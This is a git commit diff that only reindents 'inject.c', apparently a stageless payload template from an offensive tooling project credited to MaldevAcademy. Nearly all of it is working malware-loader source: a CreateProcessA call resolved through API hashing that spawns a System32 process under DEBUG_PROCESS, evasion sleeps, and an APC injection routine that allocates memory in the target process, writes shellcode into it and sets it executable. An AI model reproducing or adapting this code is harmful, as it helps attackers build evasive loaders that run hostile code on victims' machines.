e5ff675d90dc7647630ec8b7fb3a85f7be091b9b
𝕰𝖝𝖈𝖆𝖑𝖎𝖇𝖗𝖆 <83846602+Excalibra@users.noreply.github.com>
2026-03-30 21:21:14 +0300

    Refactor inject.c for code consistency and clarity

--- Linux/templates/stageless/inject.c
+++ Linux/templates/stageless/inject.c
@@ -1,6 +1,6 @@
 /*
 
-	Author: @ MaldevAcademy - https://maldevacademy.com
+        Author: @ MaldevAcademy - https://maldevacademy.com
 
 */
 
@@ -13,85 +13,85 @@
 
 BOOL CreateSuspendedProcess(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {
 
-	CHAR lpPath[MAX_PATH * 2];
-	CHAR WnDr[MAX_PATH];
+        CHAR lpPath[MAX_PATH * 2];
+        CHAR WnDr[MAX_PATH];
 
-	STARTUPINFO            Si = { 0 };
-	PROCESS_INFORMATION    Pi = { 0 };
+        STARTUPINFO            Si = { 0 };
+        PROCESS_INFORMATION    Pi = { 0 };
 
-	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
-	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
+        RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
+        RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
 
-	Si.cb = sizeof(STARTUPINFO);
+        Si.cb = sizeof(STARTUPINFO);
 
-	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) 
-		return FALSE;
+        if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) 
+                return FALSE;
 
-	// Creating the target process path 
-	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
+        // Creating the target process path 
+        sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
 
-	// API Hashing
-	cCPA cCPAu = (cCPA) GetProcAddressH(GetModuleHandleH(#-KERNEL32_VALUE-#), #-CREATEPROCESSA_VALUE-#);
+        // API Hashing
+        cCPA cCPAu = (cCPA) GetProcAddressH(GetModuleHandleH(#-KERNEL32_VALUE-#), #-CREATEPROCESSA_VALUE-#);
 
-	Sleep(15000);
-	if(!cCPAu(
-		NULL,
-		lpPath,
-		NULL,
-		NULL,
-		FALSE,
-		DEBUG_PROCESS, // Instead of CREATE_SUSPENDED
-		NULL,
-		NULL,
-		&Si,
-		&Pi)) {
-	
-		return FALSE;
-	}
+        Sleep(15000);
+        if(!cCPAu(
+                NULL,
+                lpPath,
+                NULL,
+                NULL,
+                FALSE,
+                DEBUG_PROCESS, // Instead of CREATE_SUSPENDED
+                NULL,
+                NULL,
+                &Si,
+                &Pi)) {
 
-	
-	// Filling up the OUTPUT parameter with CreateProcessA's output
-	*dwProcessId	= Pi.dwProcessId;
-	*hProcess		= Pi.hProcess;
-	*hThread		= Pi.hThread;
+                return FALSE;
+        }
 
-	Sleep(5000);
-	return TRUE;
+
+        // Filling up the OUTPUT parameter with CreateProcessA's output
+        *dwProcessId    = Pi.dwProcessId;
+        *hProcess               = Pi.hProcess;
+        *hThread                = Pi.hThread;
+
+        Sleep(5000);
+        return TRUE;
 }
 
 BOOL APCInjection(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {
 
-	SIZE_T		sNumberOfBytesWritten		= 0,
-				sSize						= sSizeOfShellcode;
-	ULONG		uOldProtection				= 0;
-	NTSTATUS	STATUS						= 0x00;
+        SIZE_T          sNumberOfBytesWritten          = 0,
+                                sSize                  = sSizeOfShellcode;
+        ULONG           uOldProtection                 = 0;
+        NTSTATUS        STATUS                         = 0x00;
 
-	if ((STATUS = NTAVM(hProcess, ppAddress, 0, &sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
+        if ((STATUS = NTAVM(hProcess, ppAddress, 0, &sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
 
-		//printf("[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
-		return FALSE;
-	}
+                //printf("[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
+                return FALSE;
+        }
 
-	////printf("[i] Allocated Memory At : 0x%p \n", *ppAddress);
+        ////printf("[i] Allocated Memory At : 0x%p \n", *ppAddress);
 
-	if ((STATUS = NTWVM(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sSizeOfShellcode) {
+        if ((STATUS = NTWVM(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sSizeOfShellcode) {
 
-		//printf("[!] NtWriteVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
-		return FALSE;
-	}
+                //printf("[!] NtWriteVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
+                return FALSE;
+        }
 
-	//printf("[+] Successfully Written %d Bytes\n", sNumberOfBytesWritten);
+        //printf("[+] Successfully Written %d Bytes\n", sNumberOfBytesWritten);
 
 
-	Sleep(2500);
-	if ((STATUS = NTPVM(hProcess, ppAddress, &sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &uOldProtection)) != 0) {
+        Sleep(2500);
+        if ((STATUS = NTPVM(hProcess, ppAddress, &sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &uOldProtection)) != 0) {
 
-		//printf("[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
-		return FALSE;
-	}
+                //printf("[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
+                return FALSE;
+        }
 
-	//printf("[+] Successfully changed memory region permission to RWX!\n");
+        //printf("[+] Successfully changed memory region permission to RWX!\n");
 
-	return TRUE;
+        return TRUE;
 
 }
